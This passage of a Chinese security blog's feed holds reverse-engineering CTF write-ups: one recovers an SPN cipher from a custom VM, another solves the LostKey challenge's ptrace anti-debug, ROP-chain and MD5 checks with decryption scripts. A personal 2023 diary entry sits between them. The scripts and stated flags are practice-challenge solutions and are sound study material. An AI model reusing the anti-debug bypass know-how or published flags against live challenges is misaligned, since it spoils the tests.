class="hljs-number">8</span> * dword_10E05C8];<br>        v11 = *&amp;byte_10E03A8[<span class="hljs-number">8</span> * dword_10E05C8++ + <span class="hljs-number">4</span>];<br>        q_input = sub_10D1307(q_input, SHIDWORD(q_input), v10, v11);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x4F</span>:<br>        q_input = sub_10D1334(q_input);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x50</span>:<br>        q_input = sub_10D127B(q_input);<br>        ++pc;<br>        <span class="hljs-keyword">if</span> ( dword_10E05C8 == <span class="hljs-number">31</span> )<br>          dword_10E05C8 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>0x4E</code>调用了虚拟机，指令长度只有5，进行两次异或操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># push q_input</span><br><span class="hljs-comment"># push qword_8D03A8[i]</span><br><br><span class="hljs-comment"># pop reg0</span><br><span class="hljs-comment"># pop reg1</span><br><span class="hljs-comment"># xor reg0 reg1</span><br><span class="hljs-comment"># xor reg0 0x0000000000000033</span><br><span class="hljs-comment"># mov q_input, reg0</span><br></code></pre></td></tr></table></figure><p><code>0x4F</code>里面调用虚拟机，指令长度较长，不过很多重复指令，当循环操作处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># mov reg2, 0</span><br><span class="hljs-comment"># mov reg4, 0</span><br><span class="hljs-comment"># mov reg2, 0</span><br><span class="hljs-comment"># for _ in range(16):</span><br>    <span class="hljs-comment"># mov reg0, reg2</span><br>    <span class="hljs-comment"># shl reg0, 2</span><br>    <span class="hljs-comment"># mov reg1, q_input</span><br>    <span class="hljs-comment"># shr reg1, reg0</span><br>    <span class="hljs-comment"># mov reg0, reg1</span><br>    <span class="hljs-comment"># and reg0, 0xf</span><br>    <span class="hljs-comment"># mov reg1, qword_8CE000[reg0]</span><br>    <span class="hljs-comment"># mov reg3, reg2</span><br>    <span class="hljs-comment"># shl reg3, 2</span><br>    <span class="hljs-comment"># shl reg1, reg3</span><br>    <span class="hljs-comment"># add reg4, reg1</span><br>    <span class="hljs-comment"># add reg2, 1</span><br><span class="hljs-comment"># mov q_input, reg4</span><br></code></pre></td></tr></table></figure><p><code>0x50</code>里面调用虚拟机操作，跟<code>0x4F</code>类似，循环操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># mov reg4, 0</span><br><span class="hljs-comment"># mov reg2, 0</span><br><span class="hljs-comment"># mov reg4, 0</span><br><span class="hljs-comment"># mov reg2, 0</span><br><span class="hljs-comment"># for _ in range(64):</span><br>    <span class="hljs-comment"># mov reg1, q_input</span><br>    <span class="hljs-comment"># shr reg1, reg2</span><br>    <span class="hljs-comment"># mov reg0, reg1</span><br>    <span class="hljs-comment"># and reg0, 1</span><br>    <span class="hljs-comment"># mov reg1, qword_8CE080[reg2]</span><br>    <span class="hljs-comment"># shl reg0, reg1</span><br>    <span class="hljs-comment"># add reg4, reg0</span><br>    <span class="hljs-comment"># add reg2, 1</span><br><span class="hljs-comment"># mov q_input, reg4</span><br><span class="hljs-comment"># add reg2, 1</span><br></code></pre></td></tr></table></figure><p>分析第一次调用<code>vm_main</code>的指令，实际上依然是循环，vm_main返回之后，还调用了一次虚拟机，做最后一次处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># push q_input</span><br><span class="hljs-comment"># push qword_8D03A8[31]</span><br><br><span class="hljs-comment"># pop reg0</span><br><span class="hljs-comment"># pop reg1</span><br><span class="hljs-comment"># xor reg0 reg1</span><br><span class="hljs-comment"># xor reg0 0x0000000000000033</span><br><span class="hljs-comment"># mov q_input, reg0</span><br></code></pre></td></tr></table></figure><p>完整的enc指令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># mov reg2, 0</span><br><br><span class="hljs-comment"># for i in range(31):</span><br>    <span class="hljs-comment"># mov reg0, 0</span><br>    <span class="hljs-comment"># mov reg1, 0</span><br>    <span class="hljs-comment"># mov reg3, 0</span><br>    <span class="hljs-comment"># mov reg4, 0</span><br><br>    <span class="hljs-comment"># push q_input</span><br>    <span class="hljs-comment"># push qword_8D03A8[i]</span><br><br>    <span class="hljs-comment"># pop reg0</span><br>    <span class="hljs-comment"># pop reg1</span><br>    <span class="hljs-comment"># xor reg0 reg1</span><br>    <span class="hljs-comment"># xor reg0 0x0000000000000033</span><br>    <span class="hljs-comment"># mov q_input, reg0</span><br><br>    <span class="hljs-comment"># mov reg2, 0</span><br>    <span class="hljs-comment"># mov reg4, 0</span><br>    <span class="hljs-comment"># mov reg2, 0</span><br>    <span class="hljs-comment"># for _ in range(16):</span><br>        <span class="hljs-comment"># mov reg0, reg2</span><br>        <span class="hljs-comment"># shl reg0, 2</span><br>        <span class="hljs-comment"># mov reg1, q_input</span><br>        <span class="hljs-comment"># shr reg1, reg0</span><br>        <span class="hljs-comment"># mov reg0, reg1</span><br>        <span class="hljs-comment"># and reg0, 0xf</span><br>        <span class="hljs-comment"># mov reg1, qword_8CE000[reg0]</span><br>        <span class="hljs-comment"># mov reg3, reg2</span><br>        <span class="hljs-comment"># shl reg3, 2</span><br>        <span class="hljs-comment"># shl reg1, reg3</span><br>        <span class="hljs-comment"># add reg4, reg1</span><br>        <span class="hljs-comment"># add reg2, 1</span><br>    <span class="hljs-comment"># mov q_input, reg4</span><br><br>    <span class="hljs-comment"># mov reg4, 0</span><br>    <span class="hljs-comment"># mov reg2, 0</span><br>    <span class="hljs-comment"># mov reg4, 0</span><br>    <span class="hljs-comment"># mov reg2, 0</span><br>    <span class="hljs-comment"># for _ in range(64):</span><br>        <span class="hljs-comment"># mov reg1, q_input</span><br>        <span class="hljs-comment"># shr reg1, reg2</span><br>        <span class="hljs-comment"># mov reg0, reg1</span><br>        <span class="hljs-comment"># and reg0, 1</span><br>        <span class="hljs-comment"># mov reg1, qword_8CE080[reg2]</span><br>        <span class="hljs-comment"># shl reg0, reg1</span><br>        <span class="hljs-comment"># add reg4, reg0</span><br>        <span class="hljs-comment"># add reg2, 1</span><br>    <span class="hljs-comment"># mov q_input, reg4</span><br>    <span class="hljs-comment"># add reg2, 1</span><br><br><span class="hljs-comment"># push q_input</span><br><span class="hljs-comment"># push qword_8D03A8[31]</span><br><br><span class="hljs-comment"># pop reg0</span><br><span class="hljs-comment"># pop reg1</span><br><span class="hljs-comment"># xor reg0 reg1</span><br><span class="hljs-comment"># xor reg0 0x0000000000000033</span><br><span class="hljs-comment"># mov q_input, reg0</span><br></code></pre></td></tr></table></figure><p>用python翻译一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-string">&quot;589ab5c1f0394baaaec4cdc462bdd60c&quot;</span><br>q_inputs = []<br>q_crypted = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">8</span>):<br>    q_inputs.append(<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;0x&quot;</span> + flag[i:i+<span class="hljs-number">8</span>][::-<span class="hljs-number">1</span>].encode().<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">for</span> q_input <span class="hljs-keyword">in</span> q_inputs:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>):<br>        q_input ^= qword_8D03A8[i]<br>        q_input ^= <span class="hljs-number">0x33</span><br><br>        reg4 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            reg0 = j &lt;&lt; <span class="hljs-number">2</span><br>            reg1 = q_input &gt;&gt; reg0<br>            reg0 = reg1 &amp; <span class="hljs-number">0xf</span><br>            reg1 = qword_8CE000[reg0]<br>            reg3 = j &lt;&lt; <span class="hljs-number">2</span><br>            reg1 = reg1 &lt;&lt; reg3<br>            reg4 += reg1<br>        q_input = reg4<br><br>        reg4 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            reg1 = q_input &gt;&gt; j<br>            reg0 = reg1 &amp; <span class="hljs-number">1</span><br>            reg1 = qword_8CE080[j]<br>            reg0 = reg0 &lt;&lt; reg1<br>            reg4 += reg0<br>        q_input = reg4<br><br>    q_input ^= qword_8D03A8[<span class="hljs-number">31</span>]<br>    q_input ^= <span class="hljs-number">0x33</span><br><br>    q_crypted.append(q_input)<br><br><span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> q_crypted:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(q))<br></code></pre></td></tr></table></figure><p>不难看出是SPN加密，逆向出解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python">ans = [<span class="hljs-number">0x9c149c0fce40e599</span>, <span class="hljs-number">0xdf4c680dcd759c04</span>, <span class="hljs-number">0xbbafb056e52e3dc0</span>, <span class="hljs-number">0x8e299c86b8f527cb</span>]<br>q_flag = []<br><br><span class="hljs-keyword">for</span> q_input <span class="hljs-keyword">in</span> q_crypted:<br>    q_input ^= <span class="hljs-number">0x33</span><br>    q_input ^= qword_8D03A8[<span class="hljs-number">31</span>]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        reg4 = q_input<br>        q_input = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">63</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            reg0 = reg4 &gt;&gt; qword_8CE080[j]<br>            reg1 = reg0 &amp; <span class="hljs-number">1</span><br>            q_input = (q_input &lt;&lt; <span class="hljs-number">1</span>) | reg1<br><br>        reg4 = q_input<br>        q_input = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            reg3 = j &lt;&lt; <span class="hljs-number">2</span><br>            reg1 = reg4 &gt;&gt; reg3<br>            reg1 = reg1 &amp; <span class="hljs-number">0xf</span><br>            reg0 = qword_8CE000.index(reg1)<br>            q_input = (q_input &lt;&lt; <span class="hljs-number">4</span>) | reg0<br><br>        q_input ^= <span class="hljs-number">0x33</span><br>        q_input ^= qword_8D03A8[i]<br>    q_flag.append(q_input)<br><br><span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> q_flag:<br>    <span class="hljs-built_in">print</span>(q.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>).decode() , end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># a9d99caef9ae999a299129c91299fc95</span><br></code></pre></td></tr></table></figure><p>解密得到flag<code>a9d99caef9ae999a299129c91299fc95</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023.log</title>
    <link href="/2023/12/31/daily/2023-log/"/>
    <url>/2023/12/31/daily/2023-log/</url>
    
    <content type="html"><![CDATA[<h1 id="noxke’s-2023"><a href="#noxke’s-2023" class="headerlink" title="noxke’s 2023"></a>noxke’s 2023</h1><h2 id=""><a href="#" class="headerlink" title=":)"></a>:)</h2><p>奇怪的一年，让我最开心的估计是linux</p><p><img src="assets/2023-12-31-23-04-23-image.png"></p><p>逐渐受不了windows繁琐的配置、臃肿的文件系统、频繁蓝屏…，2月的时候想着换linux试试，犹豫了很久该选哪个发行版，最后为了方便养老选了archlinux</p><p>-Syyu一把梭有多爽，用livecd救系统就有多狼狈，一年滚挂了五六次，小的图形化挂掉，大的直接&#x2F;etc炸掉。挂掉的次数貌似比用win多得多，但感觉值得，安装软件不用各种“高速下载”，卸载软件不用斗智斗勇…</p><p>一直很想玩服务器，今年总算捡垃圾弄了台</p><p><img src="assets/2023-12-31-23-20-25-image.png"></p><p>洋垃圾e3-1230，虽然很垃圾，但自己all in one搭了软路由、虚拟机平台、docker集群，做了多网络隔离，也挂机了数千小时的mc服务器</p><p>接触ctf一年了，没什么成绩，但感觉是段不错的经历，一年应该超过了100道逆向题</p><p><img src="assets/2023-12-31-23-34-16-image.png"></p><p>从最开始的只会Ida F5反编译，到现在能跟着调试分析vmp虚拟机，从用户态慢慢过渡到内核态，调试了c、c++、rust、python、java等各种语言运行过程，有嗯看汇编十几个小时忘记吃饭，有手撕两个小时发现是md5，有手动patch几个小时才想起ida脚本…</p><p>一直以为自己看淡了感情，但破站年度总结一看「I LOVE YOU」「恋爱色魔法」「嘘つきは恋のはじまり」都听了四五十次，庆幸洛天依是纸片人，感谢洛佬无数次帮我走出低谷。</p><h2 id="-1"><a href="#-1" class="headerlink" title=":("></a>:(</h2><p>emo</p><p>谎言</p><p>孤独</p><p>压力</p><p>未来</p><p>2023 最难受的一年</p><h2 id="echo-CONTENT-2024-task"><a href="#echo-CONTENT-2024-task" class="headerlink" title="echo $CONTENT &gt; 2024.task"></a>echo $CONTENT &gt; 2024.task</h2><p>以自己开心为目的</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界LostKey</title>
    <link href="/2023/11/27/ctf_wp/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CLostKey/"/>
    <url>/2023/11/27/ctf_wp/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CLostKey/</url>
    
    <content type="html"><![CDATA[<h3 id="LostKey"><a href="#LostKey" class="headerlink" title="LostKey"></a>LostKey</h3><p>检测参数，一共要4个参数</p><p><img src="assets/2023-11-27-23-01-41-image.png"></p><p>对每一个参数字符串clone一个进程进行处理</p><p>第一个参数是一个函数，每个字符串的都单独用一个函数处理</p><p><img src="assets/2023-11-27-23-04-47-image.png"></p><p>第二个参数是一个地址<code>-0x1000 * (i + 1) + 0x100000 + dword_80EA3AC</code></p><p><img src="assets/2023-11-27-23-12-51-image.png"></p><p>剩下的重要的就是arg，把参数字符串和一个地址放进去</p><p><img src="assets/2023-11-27-23-14-58-image.png"></p><p>看clone的操作</p><p><img src="assets/2023-11-27-23-20-28-image.png"></p><p>这里对syscall的反编译不太好，动态调一下可以知道a1和a2是传进来的enc函数，a3是上面计算的地址，-0x1c得到v8，是sys_clone子进程的栈，a5是传进来的arg，包括一个数组和参数字符串</p><p>子进程创建之后会执行a1函数，也就是enc</p><p><img src="assets/2023-11-27-23-29-51-image.png"></p><p>enc函数里注意到修改了返回地址</p><p><img src="assets/2023-11-27-23-31-48-image.png"></p><p><img src="assets/2023-11-27-23-32-02-image.png"></p><p><code>sub_8079A50</code>函数分析一下发现其实是syscall，0x1A是<code>sys_ptrace</code>，ptrace了自己，一方面反调，另一方面还有返回值，enc里面调用了两次<code>sys_ptrace</code>第一次会返回0,第二次因为已经被ptrace了，会返回-1，所以两个分支都会进入，enc剩下的部分就是打印一个没用的字符串，然后返回，进入被修改的返回地址</p><p>动态调试手动改进程的栈还有手动进入enc函数，看一下栈的内容</p><p><img src="assets/2023-11-27-23-40-29-image.png"></p><p>第一个是call的返回地址，从<code>0x000</code>开始看，第一个是arg参数，包括一个数组和参数字符串，后面的内容和计算出来的地址一样，主要看被改的返回地址</p><p><img src="assets/2023-11-27-23-43-16-image.png"></p><p><img src="assets/2023-11-27-23-43-34-image.png"></p><p>发现是一个ROP链，执行过来</p><p><img src="assets/2023-11-27-23-45-02-image.png"></p><p><img src="assets/2023-11-27-23-45-28-image.png"></p><p><img src="assets/2023-11-27-23-48-04-image.png"></p><p>参数字符串被放到了ebp里面，继续调后面的ROP</p><p><img src="assets/2023-11-27-23-48-29-image.png"></p><p>从字符串里取4个字符到eax</p><p><img src="assets/2023-11-27-23-49-24-image.png"></p><p>把4个字节异或<code>0x466C7578</code>再与<code>0x210D191E</code>比较，检测是否为<code>flag</code>，决定后面ROP链的调用，结果相等进入<code>sub_804A240</code>，结果失败进入<code>sub_804A1E0</code></p><p><code>sub_804A1E0</code>使进程结束</p><p><img src="assets/2023-11-27-23-51-35-image.png"></p><p><img src="assets/2023-11-27-23-52-14-image.png"></p><p>比较成功再取四个字符，异或<code>0x78756C46</code>与<code>0x4B1D383D</code>，检测是否为<code>&#123;Th3</code>，比较失败进程退出，比较成功继续后续调用，后面的调用跟参数字符串无关了，主要是把参数字符串复制到一个地方</p><p><img src="assets/2023-11-27-23-56-46-image.png"></p><p>分析enc2</p><p><img src="assets/2023-11-27-23-57-26-image.png"></p><p>函数里面基本相似，修改了4个全局变量，然后把返回地址改到ROP链里面去</p><p><img src="assets/2023-11-28-09-04-52-image.png"></p><p>还是一样ebp指向参数字符串，这里做传参操作，然后调用函数<code>sub_80714B0</code></p><p><img src="assets/2023-11-28-09-08-14-image.png"></p><p>从这里可以猜到要求第二段flag长度为16（实际上不是），剩余的操作应该是一个字符串复制，没有明显的根据结果返回到不同的函数</p><p><img src="assets/2023-11-28-09-10-17-image.png"></p><p>这里把ebp当参数，调用sub_8062D90，ebp是参数字符串</p><p><img src="assets/2023-11-28-09-17-32-image.png"></p><p><img src="assets/2023-11-28-09-17-48-image.png"></p><p>这个函数返回值是字符串的长度</p><p><img src="assets/2023-11-28-09-18-36-image.png"></p><p>这里如果前面返回结果小于等于1会把esp-0x1c，重新进入之前的ROP链，循环，正常情况会继续调用后面的ROP</p><p><img src="assets/2023-11-28-09-22-35-image.png"></p><p><img src="assets/2023-11-28-09-23-48-image.png"></p><p>这里从字符串里取一个字符，取反，高低4位交换，再取下一个字符，异或前一个处理后的字符，后面有rsp+8，实际上循环，该操作进行字符串长度-1次，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">s = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag2_string&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)-<span class="hljs-number">1</span>):<br>    d = s[i]<br>    d ^= <span class="hljs-number">0xff</span>    <span class="hljs-comment"># 取反</span><br>    d = ((d &lt;&lt; <span class="hljs-number">4</span>) | (d &gt;&gt; <span class="hljs-number">4</span>)) &amp; <span class="hljs-number">0xff</span>    <span class="hljs-comment"># 高低4位互换</span><br>    d ^= s[i+<span class="hljs-number">1</span>]<br>    s[i] = d<br></code></pre></td></tr></table></figure><p><img src="assets/2023-11-28-09-30-47-image.png"></p><p>上面操作结束后会到<code>sub_804A300</code>，这里是把最后一个字符异操作后异或0x41</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag2_string&quot;</span>]<br>s.append(<span class="hljs-number">0x41</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)-<span class="hljs-number">1</span>):<br> d = s[i]<br> d ^= <span class="hljs-number">0xff</span> <span class="hljs-comment"># 取反</span><br> d = ((d &lt;&lt; <span class="hljs-number">4</span>) | (d &gt;&gt; <span class="hljs-number">4</span>)) &amp; <span class="hljs-number">0xff</span> <span class="hljs-comment"># 高低4位互换</span><br> d ^= s[i+<span class="hljs-number">1</span>]<br> s[i] = d<br>s.pop()<br></code></pre></td></tr></table></figure><p><img src="assets/2023-11-28-09-33-14-image.png"></p><p><img src="assets/2023-11-28-09-33-29-image.png"></p><p>4字节一比较，不相等置位cl</p><p><img src="assets/2023-11-28-09-35-20-image.png"></p><p>后面一直都是4字节一比较</p><p><img src="assets/2023-11-28-09-37-07-image.png"></p><p>实际不为0的长度是0x19</p><p><img src="assets/2023-11-28-09-38-00-image.png"></p><p><img src="assets/2023-11-28-09-38-29-image.png"></p><p><img src="assets/2023-11-28-09-38-46-image.png"></p><p><img src="assets/2023-11-28-09-39-08-image.png"></p><p>最后根据cl的值判断进入哪个分支，<code>sub_804A1E0</code>错误分支，后面的不用再分析，已经可以解密出第二段flag <code>_key_1s_in_th3_secret_com</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">ls2 = [<span class="hljs-number">0x61</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xD0</span>,<br>       <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x68</span>]<br>ls2.reverse()<br><br>key2 = <span class="hljs-number">0x41</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ls2)):<br>    t = key2 ^ ls2[i]<br>    th = t &amp; <span class="hljs-number">0xF0</span><br>    tl = t &amp; <span class="hljs-number">0x0F</span><br>    t = (th &gt;&gt; <span class="hljs-number">4</span>) | (tl &lt;&lt; <span class="hljs-number">4</span>)<br>    t = <span class="hljs-number">0xFF</span> - t    <span class="hljs-comment"># 取反</span><br>    ls2[i] = t<br>    key2 = t<br>ls2.reverse()<br>flag2 = <span class="hljs-built_in">bytes</span>(ls2).decode()<br><span class="hljs-built_in">print</span>(flag2)<br><span class="hljs-comment"># _key_1s_in_th3_secret_com</span><br></code></pre></td></tr></table></figure><p>接下来是第三段enc3</p><p><img src="assets/2023-11-28-09-46-14-image.png"></p><p>传参给后面的函数</p><p><img src="assets/2023-11-28-09-47-35-image.png"></p><p><img src="assets/2023-11-28-09-47-47-image.png"></p><p>三个参数分别是字符串，数字6,还有一个缓冲区</p><p><img src="assets/2023-11-28-09-50-31-image.png"></p><p><img src="assets/2023-11-28-09-51-25-image.png"></p><p>这里很明显的初始化了md5<del>最开始没看出来看题目源码才知道是md5</del></p><p><img src="assets/2023-11-28-09-54-26-image.png"></p><p><img src="assets/2023-11-28-09-53-41-image.png"></p><p><img src="assets/2023-11-28-09-56-17-image.png"></p><p>计算前6个字符的md5</p><p><img src="assets/2023-11-28-09-57-07-image.png"></p><p>这里是16字节的比较，比较的数据在栈里面，每次pop到esi</p><p><img src="assets/2023-11-28-09-58-00-image.png"></p><p>也就是6个字符的md5需要是<code>7b4d6ff46ac46c3f628acc930d937d81</code>，爆破得到第三段flag</p><p><code>p4rtme</code></p><p>第四段，enc4</p><p>分析方法与前三段类似，把字符串分三次进行加密操作，最后进行比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-number">0x282786af</span><br>f2 = <span class="hljs-number">0xb2f2ba70</span><br><br>ebx = <span 